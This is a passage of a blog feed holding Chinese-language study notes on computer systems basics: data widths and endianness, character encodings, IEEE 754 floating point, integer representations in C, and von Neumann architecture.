),1Tbps&#x3D;1012 b &#x2F; s &#x3D;1000 Gbps</li></ul></li></ul><p><strong>如果把 b 换成 B ，则表示字节而不是比特（位）</strong></p><p><strong>例如，10MBps表示10兆字节／秒</strong></p><h4 id="程序中数据类型的宽度"><a href="#程序中数据类型的宽度" class="headerlink" title="程序中数据类型的宽度"></a>程序中数据类型的宽度</h4><ul><li><p>高级语言支持多种不同类型和不同长度的数据</p><blockquote><p>C 语言中 char 类型的宽度为1个字节，可表示一个字符（非数值数据），也可表示一个8位的整数（数值数据）﹣不同机器上表示的同一种类型的数据可能宽度不同</p></blockquote></li><li><p>必须确定相应的机器级数据表示方式和相应的处理指令</p></li></ul><p><img src="https://s3.bmp.ovh/imgs/2022/07/15/72f3ad0d9c78211e.png"></p><h3 id="数据存储时的排列方式"><a href="#数据存储时的排列方式" class="headerlink" title="数据存储时的排列方式"></a>数据存储时的排列方式</h3><p><strong>多字节数据都存放在连续的字节序列中, 根据数据中各字节在连续字节序列中的排列顺序不同,可以采用两种排列方式:大端方式和小端方式</strong></p><ul><li>大端方式(Big Endian)：MSB所在地址是数的地址</li></ul><table><thead><tr><th>FE</th><th>AB</th><th>04</th><th>11</th><th></th></tr></thead><tbody><tr><td>100</td><td>101</td><td>102</td><td>103</td><td>大端</td></tr><tr><td>MSB</td><td></td><td></td><td>LSB</td><td></td></tr><tr><td>103</td><td>102</td><td>101</td><td>100</td><td>小端</td></tr></tbody></table><ul><li>小端方式(Little Endian)：LSB所在的地址是数的地址</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;数据宽度&quot;&gt;&lt;a href=&quot;#数据宽度&quot; class=&quot;headerlink&quot; title=&quot;数据宽度&quot;&gt;&lt;/a&gt;数据宽度&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;比特（ bit ，位）是计算机中处理、存储、传输信息的最小单位&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;二进制信</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>非数值数据的编码表示</title>
    <link href="http://antihypezero.github.io/2022/07/15/%E9%9D%9E%E6%95%B0%E5%80%BC%E6%95%B0%E6%8D%AE%E7%9A%84%E7%BC%96%E7%A0%81%E8%A1%A8%E7%A4%BA/"/>
    <id>http://antihypezero.github.io/2022/07/15/%E9%9D%9E%E6%95%B0%E5%80%BC%E6%95%B0%E6%8D%AE%E7%9A%84%E7%BC%96%E7%A0%81%E8%A1%A8%E7%A4%BA/</id>
    <published>2022-07-15T09:42:28.910Z</published>
    <updated>2022-07-15T09:42:28.910Z</updated>
    
    <content type="html"><![CDATA[<h3 id="逻辑数据"><a href="#逻辑数据" class="headerlink" title="逻辑数据"></a>逻辑数据</h3><ul><li>用处<ul><li>表示逻辑(关系)表达式中的逻辑值：真&#x2F;假</li></ul></li><li>表示<ul><li>用一位表示，n位二进制数(位串)可表示n个逻辑数据</li></ul></li><li>运算<ul><li>按位进行，如，按位与&#x2F;按位或&#x2F;逻辑左移&#x2F;逻辑右移</li></ul></li><li>识别<ul><li>逻辑数据和数值数据在形式上并无差别，都是0&#x2F;1序列，计算机靠指令识别</li></ul></li></ul><h3 id="西文字符"><a href="#西文字符" class="headerlink" title="西文字符"></a>西文字符</h3><ul><li>特点<ul><li>用有限个字母可拼写出所有单词</li><li>只需对有限个字母、数学符号和标点符号等辅助字符编码</li><li>所有字符总数不超过256个，使用7或8个二进位可表示</li></ul></li><li>表示<ul><li>常用编码位7位ASCII码</li><li>十进制数、英文字母、专用符号、控制字符</li></ul></li><li>操作<ul><li>字符串操作，如：传送&#x2F;比较等</li></ul></li></ul><h3 id="汉字及国际字符"><a href="#汉字及国际字符" class="headerlink" title="汉字及国际字符"></a>汉字及国际字符</h3><ul><li>汉字特点<ul><li>汉字是表意文字，一个字就是一个图形</li><li>汉字数据量大，总数超过6万字</li></ul></li><li>编码形式<ul><li>输入码：对汉字用相应按键进行编码表示，用于输入</li><li>内码：用于在系统中进行存储、查找、传送等处理</li><li>字模点或轮廓描述：描述汉字字模点阵或轮廓，用于显示&#x2F;打印</li></ul></li></ul><h4 id="GB2312-80字符集"><a href="#GB2312-80字符集" class="headerlink" title="GB2312-80字符集"></a>GB2312-80字符集</h4><ul><li><p>三部分组成</p><ul><li>字母、数字和各种符号，包括英文、俄文、日文平假名与片假名、罗马字母、汉语拼音等共687个</li><li>一级常用汉字共3755个，按汉语拼音排列</li><li>二级常用汉字，共3008个，按偏旁部首排列</li></ul></li><li><p>汉字的区位码</p><ul><li>码表由94行、94列组成，行号为区号，列号为位号，各站7位</li><li>指出汉字在码表中的位置，共14位，区号在左，位号在右</li></ul></li><li><p>汉字的国标码</p><ul><li>每个汉字的区号和位号各自加上32，得到“国标码”</li><li>国标码中区号和位号各占7位，为方便处理与存储，前面添一个0，构成一个字节</li></ul></li></ul><h4 id="汉字内码"><a href="#汉字内码" class="headerlink" title="汉字内码"></a>汉字内码</h4><ul><li><p>至少需2个字节才能表示一个汉字内码</p><ul><li>由汉字的总数（超过6万字）决定!2^16&#x3D;65536</li></ul></li><li><p>可在GB2312国标码的基础上产生汉字内码</p><ul><li><p>为与 ASCI I码区别，将国标码的两个字节的第一位置“1”后得到一种汉字内码（可以有不同的编码方案）</p><blockquote><p>汉字“大”在码表中位于第20行、第83列。因此区位码为00101001010011，在区、位码上各加32得到两个字节编码，即0011010001110011B&#x3D;3473H。前面的34H和字符“4”的 ACSI 码相同，后面的73H和字符“ s ”的 ACSII 码相同，但是，将每个字节的最高位各设为“1”后，就得到其内码：B4F3H(10110100<br>11110011B)，因而不会和 ASCII 码混淆。</p></blockquote></li></ul></li></ul><h4 id="多媒体信息"><a href="#多媒体信息" class="headerlink" title="多媒体信息"></a>多媒体信息</h4><ul><li>图形、图像、音频、视频等信息在机器内部也用0和1表示<ul><li>图形用构建图形的直线或曲线的坐标点及控制点来描述，而这些坐标点或控制点则用数值数据描述</li><li>图像用构成图像的点（像素）的亮度、颜色或灰度等信息来描述，这些亮度或颜色等值则用数值数据描述</li><li>音频信息通过对模拟声音进行采样、量化（用二进制编码）来获得，因此量化后得到的是一个数值数据序列（随时间变化）</li><li>视频信息描述的是随时间变化的图像（每一幅图像称为一帧）</li><li>音乐信息（ MIDI ）通过对演奏的乐器、乐谱等相关的各类信息用0和1进行编码来描述</li></ul></li><li>多媒体信息用一个复杂的数据结构来描述，其中的基本数据或者是数值数据，或者是用0&#x2F;1编码的非数值数据</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;逻辑数据&quot;&gt;&lt;a href=&quot;#逻辑数据&quot; class=&quot;headerlink&quot; title=&quot;逻辑数据&quot;&gt;&lt;/a&gt;逻辑数据&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;用处&lt;ul&gt;
&lt;li&gt;表示逻辑(关系)表达式中的逻辑值：真&amp;#x2F;假&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;l</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>浮点数</title>
    <link href="http://antihypezero.github.io/2022/07/15/%E6%B5%AE%E7%82%B9%E6%95%B0/"/>
    <id>http://antihypezero.github.io/2022/07/15/%E6%B5%AE%E7%82%B9%E6%95%B0/</id>
    <published>2022-07-14T16:42:47.834Z</published>
    <updated>2022-08-06T09:40:50.850Z</updated>
    
    <content type="html"><![CDATA[<h3 id="科学计数法与浮点数"><a href="#科学计数法与浮点数" class="headerlink" title="科学计数法与浮点数"></a>科学计数法与浮点数</h3><blockquote><p>例：7.14 × 10^2003^</p><p>0.14为尾数(mantissa)，10为基(base,radix)，2003为阶、指数(Exponent)</p></blockquote><h3 id="规格化数形式"><a href="#规格化数形式" class="headerlink" title="规格化数形式"></a>规格化数形式</h3><blockquote><p>+&#x2F;-1. xxxxxxxxxx   ×   R^Exponent^</p></blockquote><p><strong>32-bit 规格化数：</strong></p><p>310</p><table><thead><tr><th>Sign</th><th>Exponent</th><th>Significant</th></tr></thead></table><ul><li>Sign是符号位，占1个bit</li><li>Exponent用移码表示</li><li>Significant表示xxxxxxxxx(部分尾数)</li><li>基是约定信息不必显示</li></ul><h4 id="IEEE-754标准"><a href="#IEEE-754标准" class="headerlink" title="IEEE 754标准"></a>IEEE 754标准</h4><blockquote><p>+&#x2F;-1. xxxxxxxxxx(two)   ×   R^exponent^</p><p>规定：小数点前总是“1”，可隐含表示</p></blockquote><p><strong>Single Precision(单精度)：</strong></p><table><thead><tr><th>Sign</th><th>Exponent</th><th>Significand</th></tr></thead><tbody><tr><td>1 bit</td><td>8 bits</td><td>23 bits</td></tr></tbody></table><ul><li>Sign：1表示-，0表示+</li><li>Exponent：<ul><li>SP规格化阶码范围为0000 0001(-126)~1111 1110(127)</li><li>bias为127，1023(double)</li><li>全0与全1表示特殊值</li></ul></li><li>Significand (部分尾数)：<ul><li>规格化尾数最高位总是1，所以隐含表示，省1位</li><li>1+8+23 bits (single)，1+11+52 bits (double)</li></ul></li></ul><p>SP：(-1)^S^ × (1+Significand) × 2^(Exponent-127)^</p><p>DP：(-1)^S^ × (1+Significand) × 2^(Exponent-1023)^</p><blockquote><p>机器数转化为真值</p><p>已知float型变量x的机器数为BEE00000H,求x的值是多少</p></blockquote><blockquote><table><thead><tr><th>1</th><th>0111 1101</th><th>110 0000 0000 0000 0000 0000</th></tr></thead></table><p>Sign：1 </p><p>Exponent：阶码：0111 1101 &#x3D; 125阶码的值：125-127 &#x3D; -2</p><p>Significand：1+0.5+0.25 &#x3D; 1.75</p><p>真值：-1.75 × 2^-2^ &#x3D; -0.4375</p></blockquote><blockquote><p>机器数转化为真值</p><p>已知float型变量x的值为-12.75，求x的机器数是多少</p></blockquote><blockquote><p>-12.75 &#x3D; -1100.11B &#x3D; -1.10011B × 2^3^</p><p>Sign &#x3D; 1</p><p>Exponent &#x3D; 127+3 &#x3D; 128+2 &#x3D; 1000 0010</p><p>Significant &#x3D; 100 1100 0000 0000 0000 0000</p><p>机器数：</p><table><thead><tr><th>1</th><th>1000 0010</th><th>100 1100 0000 0000 0000 0000</th></tr></thead></table></blockquote><h3 id="特殊数"><a href="#特殊数" class="headerlink" title="特殊数"></a>特殊数</h3><h4 id="0的机器数表示"><a href="#0的机器数表示" class="headerlink" title="0的机器数表示"></a>0的机器数表示</h4><ul><li>Exponent：all zeros</li><li>Significand：all zeros</li></ul><blockquote><p>+0：0 00000000 00000000000000000000000</p><p>-0：1 00000000 00000000000000000000000</p></blockquote><h4 id="∞-x2F-∞的机器数表示"><a href="#∞-x2F-∞的机器数表示" class="headerlink" title="+∞&#x2F;-∞的机器数表示"></a>+∞&#x2F;-∞的机器数表示</h4><ul><li>Exponent：all ones</li><li>Significand：all zeros</li></ul><blockquote><p>+∞：0 11111111 00000000000000000000000</p><p>-∞：1 11111111 00000000000000000000000</p></blockquote><blockquote><p>浮点数除以0的结果是+&#x2F;-∞，而不是溢出异常(整数除以0为异常)</p></blockquote><h4 id="“非数”的表示"><a href="#“非数”的表示" class="headerlink" title="“非数”的表示"></a>“非数”的表示</h4><ul><li>Exponent&#x3D;255</li><li>Significand：nonzero</li></ul><blockquote><p>Not a Numer(NaN)</p></blockquote><blockquote><p>例：sqrt(-4.0) &#x3D; NaN0&#x2F;0 &#x3D; NaN</p><p>+∞-(+∞) &#x3D; NaN∞&#x2F;∞ &#x3D; NaN</p></blockquote><h4 id="非规格化数"><a href="#非规格化数" class="headerlink" title="非规格化数"></a>非规格化数</h4><ul><li>Exponent &#x3D; 0</li><li>Significand：nonzero</li></ul><blockquote><p>表示Denorms(非规格化数)</p></blockquote><h3 id="浮点数精度"><a href="#浮点数精度" class="headerlink" title="浮点数精度"></a>浮点数精度</h3><p>当数据是一个不可表示数时，机器将其转化为最邻近的可表示数。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;科学计数法与浮点数&quot;&gt;&lt;a href=&quot;#科学计数法与浮点数&quot; class=&quot;headerlink&quot; title=&quot;科学计数法与浮点数&quot;&gt;&lt;/a&gt;科学计数法与浮点数&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;例：7.14 × 10^2003^&lt;/p&gt;
&lt;p&gt;0.14</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>C语言中的整数表示</title>
    <link href="http://antihypezero.github.io/2022/07/10/C%E8%AF%AD%E8%A8%80%E4%B8%AD%E7%9A%84%E6%95%B4%E6%95%B0%E8%A1%A8%E7%A4%BA/"/>
    <id>http://antihypezero.github.io/2022/07/10/C%E8%AF%AD%E8%A8%80%E4%B8%AD%E7%9A%84%E6%95%B4%E6%95%B0%E8%A1%A8%E7%A4%BA/</id>
    <published>2022-07-09T17:38:59.231Z</published>
    <updated>2022-07-09T17:38:59.231Z</updated>
    
    <content type="html"><![CDATA[<h2 id="C语言支持的基本数据类型"><a href="#C语言支持的基本数据类型" class="headerlink" title="C语言支持的基本数据类型"></a>C语言支持的基本数据类型</h2><p><img src="https://s3.bmp.ovh/imgs/2022/07/10/90acb2c8fd9ff1a4.png"></p><h2 id="无符号整数"><a href="#无符号整数" class="headerlink" title="无符号整数"></a>无符号整数</h2><ul><li><p>机器中字的位排列顺序有两种方式：</p><ul><li>高到低位从左到右：0000 0000 0000 1011</li><li>高到低位从右到左：1011 0000 0000 0000</li><li>用LSB表示最低有效位，MSB表示最高有效位</li><li>高到低位多采用从左往右排列</li></ul></li><li><p>一般在全是正数运算且不出现复值结果的场合下，可使用无符号数表示。例如，地址运算、编号表示等。</p></li><li><p>无符号整数的编码中没有符号位</p></li><li><p>能表示的最大值大于位数相同的带符号整数的最大值</p><blockquote><p>8位无符号整数的最大值是255(1111 1111)</p><p>8位有符号整数的最大值是127(0111 1111)</p></blockquote></li></ul><h2 id="带符号整数"><a href="#带符号整数" class="headerlink" title="带符号整数"></a>带符号整数</h2><ul><li>计算机必须能处理正数和负数，用MSB表示数符(0–整数，1–负数)</li><li>有三种定点编码方式<ul><li>原码—-定点小数，用来表示浮点数的尾数</li><li>移码—-定点整数，用于表示浮点数的阶</li><li>补码—-所有计算机都用补码来表示带符号整数</li></ul></li></ul><h2 id="C语言程序中的整数"><a href="#C语言程序中的整数" class="headerlink" title="C语言程序中的整数"></a>C语言程序中的整数</h2><p><img src="https://s3.bmp.ovh/imgs/2022/07/10/b217a8936d5c29ba.png"></p><p><img src="https://s3.bmp.ovh/imgs/2022/07/10/ce24b332e79a6522.png"></p><p><img src="https://s3.bmp.ovh/imgs/2022/07/10/96216700398374ce.png"></p><h3 id="编译器处理常量时默认的类型"><a href="#编译器处理常量时默认的类型" class="headerlink" title="编译器处理常量时默认的类型"></a>编译器处理常量时默认的类型</h3><p><img src="https://s3.bmp.ovh/imgs/2022/07/10/8e9e9fc5389d7175.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;C语言支持的基本数据类型&quot;&gt;&lt;a href=&quot;#C语言支持的基本数据类型&quot; class=&quot;headerlink&quot; title=&quot;C语言支持的基本数据类型&quot;&gt;&lt;/a&gt;C语言支持的基本数据类型&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;https://s3.bmp.ovh/i</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>定点数的编码表示</title>
    <link href="http://antihypezero.github.io/2022/07/10/%E5%AE%9A%E7%82%B9%E6%95%B0%E7%9A%84%E7%BC%96%E7%A0%81%E8%A1%A8%E7%A4%BA/"/>
    <id>http://antihypezero.github.io/2022/07/10/%E5%AE%9A%E7%82%B9%E6%95%B0%E7%9A%84%E7%BC%96%E7%A0%81%E8%A1%A8%E7%A4%BA/</id>
    <published>2022-07-09T17:15:56.465Z</published>
    <updated>2022-07-09T17:15:56.466Z</updated>
    
    <content type="html"><![CDATA[<h2 id="原码"><a href="#原码" class="headerlink" title="原码"></a>原码</h2><p><img src="https://s3.bmp.ovh/imgs/2022/07/10/0005737aa170a688.png"></p><p>不足：</p><ul><li>0的表示不唯一，不利于编程</li><li>加、减运算方式不统一</li><li>需额外对符号位进行处理，不利于硬件设计</li><li>当a&lt;b时，实现a-b比价困难</li></ul><p><strong>从50年代开始，整数都采用补码来表示，但浮点数的尾数用原码定点小数表示</strong></p><h2 id="补码"><a href="#补码" class="headerlink" title="补码"></a>补码</h2><p><img src="https://s3.bmp.ovh/imgs/2022/07/10/9dfdea2fe3dac341.png"></p><p><img src="https://s3.bmp.ovh/imgs/2022/07/10/eccdc12aa75327c5.png"></p><p><img src="https://s3.bmp.ovh/imgs/2022/07/10/c46bb0da7956a42a.png"></p><p><img src="https://s3.bmp.ovh/imgs/2022/07/10/33e7f4aeb9f3b082.png"></p><p><img src="https://s3.bmp.ovh/imgs/2022/07/10/fe721f4dca61b33f.png"></p><h2 id="移码表示"><a href="#移码表示" class="headerlink" title="移码表示"></a>移码表示</h2><p><img src="https://s3.bmp.ovh/imgs/2022/07/10/c5a4df4ffc2d941d.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;原码&quot;&gt;&lt;a href=&quot;#原码&quot; class=&quot;headerlink&quot; title=&quot;原码&quot;&gt;&lt;/a&gt;原码&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;https://s3.bmp.ovh/imgs/2022/07/10/0005737aa170a688.png&quot;&gt;&lt;/p</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>数值与编码</title>
    <link href="http://antihypezero.github.io/2022/07/10/%E6%95%B0%E5%80%BC%E4%B8%8E%E7%BC%96%E7%A0%81/"/>
    <id>http://antihypezero.github.io/2022/07/10/%E6%95%B0%E5%80%BC%E4%B8%8E%E7%BC%96%E7%A0%81/</id>
    <published>2022-07-09T16:43:21.323Z</published>
    <updated>2022-07-09T16:43:21.323Z</updated>
    
    <content type="html"><![CDATA[<h2 id="“转换”概念在数据表示中的反应"><a href="#“转换”概念在数据表示中的反应" class="headerlink" title="“转换”概念在数据表示中的反应"></a>“转换”概念在数据表示中的反应</h2><p><img src="https://s3.bmp.ovh/imgs/2022/07/09/54dc8463ae2c4121.png"></p><p><img src="https://s3.bmp.ovh/imgs/2022/07/09/bc779fddbb4dead3.png"></p><h2 id="信息的二进制编码"><a href="#信息的二进制编码" class="headerlink" title="信息的二进制编码"></a>信息的二进制编码</h2><ul><li><p>机器级数据分两大类</p><ul><li>数值数据：无符号数、带符号整数、浮点数(实数)</li><li>非数值数据：逻辑数(包括位串)、西文字符和汉字</li></ul></li><li><p>计算机内部所有信息用二进制进行编码</p></li><li><p>用二进制的原因</p><ul><li>制造两个稳定态的物理器件容易(电位高&#x2F;低、脉冲有&#x2F;无、正&#x2F;负极)</li><li>二进制编码、计数、运算规则简单</li><li>正好与逻辑命题真&#x2F;假对应，便于逻辑运算</li><li>可方便地用逻辑电路实现算术运算</li></ul></li><li><p>真值和机器数</p><ul><li>机器数：用0和1编码的计算机内部的0&#x2F;1序列</li><li>真值：真正的值，即现实中带正负号的数</li></ul></li></ul><blockquote><p>unsigned short型变量x的真值是127，其机器数是多少？</p><p>127&#x3D;2^7-1，其机器数为0000 0000 0111 1111</p></blockquote><h2 id="数值数据的表示"><a href="#数值数据的表示" class="headerlink" title="数值数据的表示"></a>数值数据的表示</h2><ul><li>数值数据表示的三要素<ul><li>进位计数制</li><li>定、浮点表示</li><li>如何用二进制编码</li></ul></li><li>进位计数制<ul><li>十进制、二进制、十六进制、八进制及其相互转换</li></ul></li><li>定&#x2F;浮点表示(解决小数点问题)<ul><li>定点整数、定点小数</li><li>浮点数(可用一个定点小数和一个定点整数来表示)</li></ul></li><li>定点数的编码(解决正负号问题)<ul><li>原码、补码、反码、移码</li></ul></li></ul><h2 id="数制及其转化"><a href="#数制及其转化" class="headerlink" title="数制及其转化"></a>数制及其转化</h2><h3 id="R进位计数制"><a href="#R进位计数制" class="headerlink" title="R进位计数制"></a>R进位计数制</h3><ul><li>采用R个基本符号(0，1，2，3，R-1)表示各位数字</li><li>逢R进1</li><li>对于每一数位i，该位上的权为R^i</li><li>R被称为该数字系统的基</li></ul><p>八进制：R&#x3D;8，基本符号为0，1，2，3，4，5，6，7 (后缀”O”表示)</p><p>十六进制：R&#x3D;16，基本符号为0，1，2，3，4，5，6，7，8，9，A，B，C，D，E，F (后缀”H”或前缀”OX”表示)</p><p><img src="https://s3.bmp.ovh/imgs/2022/07/09/b2070961757cdc98.png"></p><h3 id="进制间转化"><a href="#进制间转化" class="headerlink" title="进制间转化"></a>进制间转化</h3><ul><li>略</li></ul><h2 id="定点数和浮点数"><a href="#定点数和浮点数" class="headerlink" title="定点数和浮点数"></a>定点数和浮点数</h2><ul><li>计算机中只能通过约定小数点的位置来表示<ul><li>小数点位置约定在固定位置的数称为定点数</li><li>小数点位置约定为可浮动的数称为浮点数</li></ul></li><li>定点小数用来表示浮点数的尾数部分</li><li>定点整数用来表示整数，分带符号整数和无符号整数</li><li>任何实数：X&#x3D;(-1)^s* M * R^E<ul><li>其中，S取值为0或1，决定X的符号；M是二进制定点小数，为X的尾数；E是一个二进制定点整数，为数X的阶或指数 ；R是基数，可以是2、4、8等。只要表示S、M、E，就能确定X的值，这称为浮点数。</li></ul></li></ul><table><thead><tr><th align="center">S</th><th align="center">E</th><th align="center">M</th></tr></thead></table>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;“转换”概念在数据表示中的反应&quot;&gt;&lt;a href=&quot;#“转换”概念在数据表示中的反应&quot; class=&quot;headerlink&quot; title=&quot;“转换”概念在数据表示中的反应&quot;&gt;&lt;/a&gt;“转换”概念在数据表示中的反应&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;https://</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>冯·诺伊曼结构与现代计算机结构</title>
    <link href="http://antihypezero.github.io/2022/07/09/%E5%86%AF%C2%B7%E8%AF%BA%E4%BC%8A%E6%9B%BC%E7%BB%93%E6%9E%84%E4%B8%8E%E7%8E%B0%E4%BB%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%93%E6%9E%84/"/>
    <id>http://antihypezero.github.io/2022/07/09/%E5%86%AF%C2%B7%E8%AF%BA%E4%BC%8A%E6%9B%BC%E7%BB%93%E6%9E%84%E4%B8%8E%E7%8E%B0%E4%BB%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%93%E6%9E%84/</id>
    <published>2022-07-08T18:11:45.808Z</published>
    <updated>2022-07-09T10:23:08.295Z</updated>
    
    <content type="html"><![CDATA[<h2 id="冯·诺伊曼结构"><a href="#冯·诺伊曼结构" class="headerlink" title="冯·诺伊曼结构"></a>冯·诺伊曼结构</h2><h3 id="其最重要的思想时”存储程序“工作方式："><a href="#其最重要的思想时”存储程序“工作方式：" class="headerlink" title="其最重要的思想时”存储程序“工作方式："></a>其最重要的思想时”<em>存储程序</em>“工作方式：</h3><p>任何要计算机完成的工作都要先被编写成程序，然后将程序和原始数据送入主存并启动执行。一旦程序被启动，计算机应能在不需操作人员干预下，自动完成逐条取出指令的任务。</p><ul><li>要有个主存存放程序和数据</li><li>要有一个自动逐条去除指令的部件</li><li>要有能具体执行指令(即运算)的部件</li><li>程序由指令构成</li><li>指令描述如何对数据进行处理</li><li>要有将程序和原始数据输入计算机的部件</li><li>要有将运算结果输出的部件</li></ul><p><img src="https://s3.bmp.ovh/imgs/2022/07/09/1e5f1ed8b6e2fcba.jpg" title="IAS计算机结构"></p><p><img src="https://s3.bmp.ovh/imgs/2022/07/09/796fe2c8c1557377.png" title="冯·诺伊曼计算机模型"></p><p>早期，部件之间用<strong>分散方式</strong>相连</p><p>现在，部件之间大多用<strong>总线方式</strong>相连</p><h3 id="冯·诺伊曼结构的主要思想："><a href="#冯·诺伊曼结构的主要思想：" class="headerlink" title="冯·诺伊曼结构的主要思想："></a>冯·诺伊曼结构的主要思想：</h3><ol><li>计算机应由运算器、控制器、存储器、输入设备和输出设备五个基本组件组成。</li><li>各基本部件的功能是:<ul><li><strong>存储器</strong>不仅能存放数据，而且能存放指令，形式上两者没有区别名单计算机应能区分数据还是指令；</li><li><strong>控制器</strong>应能自动取出指令来执行；</li><li><strong>运算器</strong>应能进行加&#x2F;减&#x2F;乘&#x2F;除四种基本运算，并且能进行一些逻辑运算和附加运算：</li><li>操作人员可以通过<strong>输入设备、输出设备</strong>和主机进行通信。</li></ul></li><li>内部以<strong>二进制</strong>表示指令和数据，每条指令由操作码和地址吗两部分组成。操作码操作类型，地址码指出操作数的地址，由一串指令组成程序。</li><li>采用”<strong>存储程序</strong>“工作方式</li></ol><h2 id="现代计算机结构"><a href="#现代计算机结构" class="headerlink" title="现代计算机结构"></a>现代计算机结构</h2><p><img src="https://i.bmp.ovh/imgs/2022/07/09/6e24f636df2a3e9e.png" title="现代计算机结构模型"></p><p>CPU:中央处理器；  PC：程序计数器；MAR:存储器地址寄存器</p><p>ALU：算术逻辑部件；IR：指令寄存器；  MDR：存储器数据寄存器</p><p>GPRs:通用寄存器组(由若干通用寄存器组成，早期就是累加器)</p><h3 id="计算机工作方式"><a href="#计算机工作方式" class="headerlink" title="计算机工作方式"></a>计算机工作方式</h3><ol><li>数据和操作指令按序存放存储器，有对应的存储单元地址(原材料和菜谱放在架子上，每个架子有编号)</li><li>从某一指定存储地址开始(某一指定菜谱)</li><li>取指令并译码(看菜谱)</li><li>取数据(拿原材料)</li><li>指令执行并回写结果(进行做菜并装盘)</li><li>算出下一存储地址(算出下一道菜所用菜谱的位置)</li></ol><h3 id="数据与指令都存放在存储器中，都是0-x2F-1序列，为了分辨，我们需要知道"><a href="#数据与指令都存放在存储器中，都是0-x2F-1序列，为了分辨，我们需要知道" class="headerlink" title="数据与指令都存放在存储器中，都是0&#x2F;1序列，为了分辨，我们需要知道"></a>数据与指令都存放在存储器中，都是0&#x2F;1序列，为了分辨，我们需要知道</h3><ul><li>操作码(操作性质)</li><li>源操作数1 或&#x2F;和 源操作数2 (立即数、寄存器编号、存储地址)</li><li>目的操作数地址 (寄存器编号、存储地址)</li><li>存储地址地址的描述与操作数的数据结构有关</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;冯·诺伊曼结构&quot;&gt;&lt;a href=&quot;#冯·诺伊曼结构&quot; class=&quot;headerlink&quot; title=&quot;冯·诺伊曼结构&quot;&gt;&lt;/a&gt;冯·诺伊曼结构&lt;/h2&gt;&lt;h3 id=&quot;其最重要的思想时”存储程序“工作方式：&quot;&gt;&lt;a href=&quot;#其最重要的思想时”存储程序“</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>计算机系统基础</title>
    <link href="http://antihypezero.github.io/2022/07/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/"/>
    <id>http://antihypezero.github.io/2022/07/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/</id>
    <published>2022-07-08T18:11:43.224Z</published>
    <updated>2022-07-09T12:11:51.495Z</updated>
    
    <content type="html"><![CDATA[<h2 id="编译系统"><a href="#编译系统" class="headerlink" title="编译系统"></a>编译系统</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">printf(&quot;Hello World!\n&quot;);</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行这个程序，<em><strong>GCC</strong></em>编译器编译过程可分为四个阶段—-预处理阶段、编译阶段、汇编阶段、链接阶段</p><p><img src="https://s3.bmp.ovh/imgs/2022/07/08/ca9a81b4b8efc7a2.jpg"></p><p>理解编译系统如何工作对我们有很大益处：</p><ul><li><p>优化程序性嫩滑</p></li><li><p>理解链接时的错误</p></li><li><p>规避安全漏洞</p></li></ul><h2 id="系统的硬件组织"><a href="#系统的硬件组织" class="headerlink" title="系统的硬件组织"></a>系统的硬件组织</h2><ol><li>总线</li><li>I&#x2F;O(输入&#x2F;输出)设备</li><li>主存</li><li>处理器</li></ol><p><img src="https://i.bmp.ovh/imgs/2022/07/08/ffe190ed0a38cc22.jpg"></p><h2 id="运行hello-c"><a href="#运行hello-c" class="headerlink" title="运行hello.c"></a>运行hello.c</h2><p><img src="https://i.bmp.ovh/imgs/2022/07/08/41ab762fced6ea1d.jpg"></p><p><img src="https://i.bmp.ovh/imgs/2022/07/08/5cbc493e8b46cb19.jpg"></p><p><img src="https://s3.bmp.ovh/imgs/2022/07/08/312f9b6926cd25d2.jpg"></p><h2 id="开发和运行程序需要什么支撑"><a href="#开发和运行程序需要什么支撑" class="headerlink" title="开发和运行程序需要什么支撑"></a>开发和运行程序需要什么支撑</h2><p>用高级语言开发程序需要复杂的支撑环境</p><ul><li>需要编辑器编写源程序</li><li>需要一套翻译转换软件处理各类源程序<ul><li>编译方式：预处理程序、编译器、汇编器、链接器</li><li>解释方式：解释程序</li></ul></li><li>需要一个可以执行程序的界面(环境)<ul><li>GUI方式：图形用户界面</li><li>CUI方式：命令行用户界面</li></ul></li></ul><p>支撑程序开发和运行的环境由<strong>系统软件</strong>提供</p><p>最重要的系统软件是<strong>操作系统</strong>和<strong>语言处理系统</strong></p><p>语言处理系统运行在操作系统之上，操作系统利用指令管理硬件</p><h2 id="计算机系统层次"><a href="#计算机系统层次" class="headerlink" 